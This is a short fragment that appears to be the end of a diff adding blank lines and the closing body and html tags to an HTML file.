+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
